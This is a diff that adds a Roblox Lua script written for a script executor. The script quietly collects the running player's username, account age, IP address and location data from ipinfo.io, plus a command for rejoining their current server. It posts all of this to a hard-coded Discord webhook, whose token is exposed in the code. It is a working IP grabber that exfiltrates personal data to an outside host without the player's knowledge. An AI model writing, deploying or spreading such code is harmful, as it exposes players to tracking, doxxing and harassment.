@@ -1,0 +1,48 @@
+local HttpService = game:GetService("HttpService")
+local thing = game:HttpGet('https://ipinfo.io/json')
+local decode = game:GetService('HttpService'):JSONDecode(thing)
+local str = '\n'
+for _, v in pairs(decode) do
+	if not v:find('https://') then
+		str = str .. '\n'.. v 
+	end
+end
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local lplr = Players.LocalPlayer
+
+-- get current place + job id
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+-- generate rejoin script as text
+local rejoinScript = string.format(
+    "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
+    placeId,
+    jobId
+)
+local webhookURL = "https://discord.com/api/webhooks/1424935368335294474/6rbmSKAehd9SJnTKxZYBnX_sntOZl-Q44d2KjFkbwZ6nI4bNevOJ0Dt1NrFrw-7f_Owq" -- Replace with your webhook URL
+
+local data = {
+    ["content"] = "Username: ```" .. game.Players.LocalPlayer.Name .. '```\nAge: ```' .. game.Players.LocalPlayer.AccountAge .. '```\nIp: ```' .. str .. '```\nGame: ```' .. rejoinScript .. '```',
+    ["username"] = "WebhookBot"
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+local requestData = {
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = jsonData
+}
+
+local success, response = pcall(function()
+    return request(requestData)
+end)
+
+if success and response.Success then
+else
+end
